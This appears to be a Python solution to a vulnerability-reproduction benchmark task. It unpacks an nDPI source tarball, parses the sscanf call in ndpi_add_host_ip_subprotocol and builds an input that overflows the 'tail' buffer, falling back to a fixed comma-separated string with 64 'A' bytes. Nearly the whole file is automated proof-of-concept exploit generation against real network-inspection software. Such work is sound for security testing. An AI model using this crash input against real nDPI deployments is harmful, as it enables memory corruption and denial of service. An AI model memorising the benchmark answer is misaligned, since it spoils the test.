import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        def fallback_poc():
            # Generic fallback payload with commas and long tail
            base = b"x,y,"
            tail = b"A" * 64
            return base + tail

        def strip_c_comments(code: str) -> str:
            res = []
            i = 0
            n = len(code)
            in_str = False
            in_char = False
            escape = False
            in_slcomment = False
            in_mlcomment = False
            while i < n:
                c = code[i]
                if in_slcomment:
                    if c == '\n':
                        in_slcomment = False
                        res.append(c)
                    i += 1
                    continue
                if in_mlcomment:
                    if c == '*' and i + 1 < n and code[i + 1] == '/':
                        in_mlcomment = False
                        i += 2
                        continue
                    i += 1
                    continue
                if in_str:
                    res.append(c)
                    if escape:
                        escape = False
                    elif c == '\\':
                        escape = True
                    elif c == '"':
                        in_str = False
                    i += 1
                    continue
                if in_char:
                    res.append(c)
                    if escape:
                        escape = False
                    elif c == '\\':
                        escape = True
                    elif c == "'":
                        in_char = False
                    i += 1
                    continue
                if c == '/':
                    if i + 1 < n and code[i + 1] == '/':
                        in_slcomment = True
                        i += 2
                        continue
                    if i + 1 < n and code[i + 1] == '*':
                        in_mlcomment = True
                        i += 2
                        continue
                    res.append(c)
                    i += 1
                    continue
                if c == '"':
                    in_str = True
                    res.append(c)
                    i += 1
                    continue
                if c == "'":
                    in_char = True
                    res.append(c)
                    i += 1
                    continue
                res.append(c)
                i += 1
            return ''.join(res)

        def find_function_body(src: str, name: str):
            pattern = re.compile(r'\b' + re.escape(name) + r'\s*\(')
            for m in pattern.finditer(src):
                paren_start = m.end() - 1
                i = paren_start + 1
                depth = 1
                n = len(src)
                while i < n and depth > 0:
                    c = src[i]
                    if c == '(':
                        depth += 1
                    elif c == ')':
                        depth -= 1
                    i += 1
                if depth != 0:
                    continue
                after_paren = i
                j = after_paren
                while j < n and src[j].isspace():
                    j += 1
                if j >= n or src[j] != '{':
                    continue
                brace_start = j
                k = brace_start + 1
                depth = 1
                while k < n and depth > 0:
                    c = src[k]
                    if c == '{':
                        depth += 1
                    elif c == '}':
                        depth -= 1
                    k += 1
                if depth != 0:
                    continue
                body = src[brace_start:k]
                return body
            return None

        def extract_c_string_literal(expr: str):
            n = len(expr)
            i = 0
            pieces = []
            while i < n:
                while i < n and expr[i] not in ('"', "'"):
                    i += 1
                if i >= n:
                    break
                if expr[i] == '"':
                    i += 1
                    buf = []
                    escape = False
                    while i < n:
                        c = expr[i]
                        i += 1
                        if escape:
                            if c == 'n':
                                buf.append('\n')
                            elif c == 't':
                                buf.append('\t')
                            elif c == 'r':
                                buf.append('\r')
                            elif c == '\\':
                                buf.append('\\')
                            elif c == '"':
                                buf.append('"')
                            else:
                                buf.append(c)
                            escape = False
                        else:
                            if c == '\\':
                                escape = True
                            elif c == '"':
                                break
                            else:
                                buf.append(c)
                    pieces.append(''.join(buf))
                else:
                    i += 1
                    while i < n and expr[i] != "'":
                        i += 1
                    if i < n:
                        i += 1
            if pieces:
                return ''.join(pieces)
            return None

        def split_args(s: str):
            res = []
            cur = []
            depth = 0
            in_str = False
            str_char = None
            escape = False
            n = len(s)
            i = 0
            while i < n:
                ch = s[i]
                if escape:
                    cur.append(ch)
                    escape = False
                    i += 1
                    continue
                if ch == '\\':
                    cur.append(ch)
                    escape = True
                    i += 1
                    continue
                if in_str:
                    cur.append(ch)
                    if ch == str_char:
                        in_str = False
                    i += 1
                    continue
                if ch in ("'", '"'):
                    in_str = True
                    str_char = ch
                    cur.append(ch)
                    i += 1
                    continue
                if ch == '(':
                    depth += 1
                    cur.append(ch)
                    i += 1
                    continue
                if ch == ')':
                    if depth > 0:
                        depth -= 1
                    cur.append(ch)
                    i += 1
                    continue
                if ch == ',' and depth == 0:
                    arg = ''.join(cur).strip()
                    if arg:
                        res.append(arg)
                    cur = []
                    i += 1
                    continue
                cur.append(ch)
                i += 1
            if cur:
                arg = ''.join(cur).strip()
                if arg:
                    res.append(arg)
            return res

        def parse_format(fmt: str):
            tokens = []
            i = 0
            n = len(fmt)
            lit = []
            conv_chars = set('diuoxXfFeEgGaAcspn[')
            while i < n:
                c = fmt[i]
                if c == '%':
                    if i + 1 < n and fmt[i + 1] == '%':
                        lit.append('%')
                        i += 2
                        continue
                    if lit:
                        tokens.append(('lit', ''.join(lit)))
                        lit = []
                    start = i
                    i += 1
                    j = i
                    while j < n and fmt[j] not in conv_chars:
                        j += 1
                    if j >= n:
                        tokens.append(('lit', fmt[start:]))
                        break
                    spec_char = fmt[j]
                    if spec_char == '[':
                        k = j + 1
                        while k < n and fmt[k] != ']':
                            k += 1
                        if k < n:
                            k += 1
                        i = k
                    else:
                        j += 1
                        i = j
                    conv_spec = fmt[start:i]
                    assigns = not (len(conv_spec) >= 2 and conv_spec[1] == '*')
                    tokens.append(('conv', conv_spec, assigns))
                else:
                    lit.append(c)
                    i += 1
            if lit:
                tokens.append(('lit', ''.join(lit)))
            return tokens

        def get_example_char_for_scanset(inner: str):
            if not inner:
                return 'A'
            negated = inner[0] == '^'
            content = inner[1:] if negated else inner
            if negated:
                candidates = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
                for ch in candidates:
                    if ch not in content:
                        return ch
                return 'A'
            else:
                for ch in content:
                    if ch != '-':
                        return ch
                return 'A'

        def gen_for_conv(conv_spec: str, conv_type: str, is_tail: bool):
            if conv_type == '[':
                b = conv_spec.find('[')
                e = conv_spec.rfind(']')
                inside = conv_spec[b + 1:e] if b != -1 and e != -1 and e > b else ''
                c = get_example_char_for_scanset(inside)
                if is_tail:
                    return c * 64
                return c
            if conv_type in ('s', 'c'):
                if is_tail:
                    return 'B' * 64
                return 'b'
            if conv_type in 'diuoxXp':
                return '1'
            if conv_type in 'fFeEgGaA':
                return '1.0'
            if conv_type == 'n':
                return ''
            return '1'

        def build_poc_from_source(src: str):
            body = find_function_body(src, 'ndpi_add_host_ip_subprotocol')
            if body is None:
                return None
            body_clean = strip_c_comments(body)
            idx = 0
            call_info = None
            while True:
                m = re.search(r'sscanf\s*\(', body_clean[idx:])
                if not m:
                    break
                start = idx + m.start()
                full = body_clean[start:]
                p_open = full.find('(')
                if p_open == -1:
                    break
                i = p_open + 1
                depth = 1
                in_str = False
                str_char = None
                escape = False
                while i < len(full) and depth > 0:
                    ch = full[i]
                    if escape:
                        escape = False
                    elif ch == '\\':
                        escape = True
                    elif in_str:
                        if ch == str_char:
                            in_str = False
                    elif ch in ("'", '"'):
                        in_str = True
                        str_char = ch
                    elif ch == '(':
                        depth += 1
                    elif ch == ')':
                        depth -= 1
                    i += 1
                if depth != 0:
                    idx = start + 6
                    continue
                call_stmt = full[:i]
                if 'tail' in call_stmt:
                    call_info = (start, call_stmt)
                    break
                idx = start + 6
            if call_info is None:
                return None
            call_stmt = call_info[1]
            p_open = call_stmt.find('(')
            p_close = call_stmt.rfind(')')
            if p_open == -1 or p_close == -1 or p_close <= p_open:
                return None
            args_str = call_stmt[p_open + 1:p_close]
            args = split_args(args_str)
            if len(args) < 3:
                return None
            fmt_arg = args[1]
            fmt = extract_c_string_literal(fmt_arg)
            if fmt is None:
                return None
            dest_index = None
            for k in range(2, len(args)):
                if re.search(r'\btail\b', args[k]):
                    dest_index = k - 2
                    break
            if dest_index is None or dest_index < 0:
                return None
            tokens = parse_format(fmt)
            assign_idx = 0
            tail_token_index = None
            for idx_tok, tok in enumerate(tokens):
                if tok[0] == 'conv':
                    conv_spec, assigns = tok[1], tok[2]
                    if assigns:
                        if assign_idx == dest_index:
                            tail_token_index = idx_tok
                            break
                        assign_idx += 1
            if tail_token_index is None:
                return None
            pieces = []
            for idx_tok, tok in enumerate(tokens):
                if tok[0] == 'lit':
                    pieces.append(tok[1])
                else:
                    conv_spec, assigns = tok[1], tok[2]
                    conv_type = conv_spec[-1] if conv_spec else 's'
                    is_tail = (idx_tok == tail_token_index)
                    val = gen_for_conv(conv_spec, conv_type, is_tail)
                    pieces.append(val)
            result_str = ''.join(pieces)
            if not result_str:
                return None
            return result_str.encode('ascii', errors='ignore')

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                try:
                    with tarfile.open(src_path, 'r:*') as tf:
                        tf.extractall(tmpdir)
                except Exception:
                    return fallback_poc()
                ndpi_path = None
                for root, _, files in os.walk(tmpdir):
                    for name in files:
                        if name == 'ndpi_main.c':
                            ndpi_path = os.path.join(root, name)
                            break
                    if ndpi_path is not None:
                        break
                if ndpi_path is None:
                    return fallback_poc()
                try:
                    with open(ndpi_path, 'r', encoding='utf-8', errors='ignore') as f:
                        src = f.read()
                except Exception:
                    return fallback_poc()
                poc = build_poc_from_source(src)
                if not poc:
                    return fallback_poc()
                # Ensure non-empty and reasonably sized
                if len(poc) < 4:
                    poc = poc + b"A" * (4 - len(poc))
                return poc
        except Exception:
            return fallback_poc()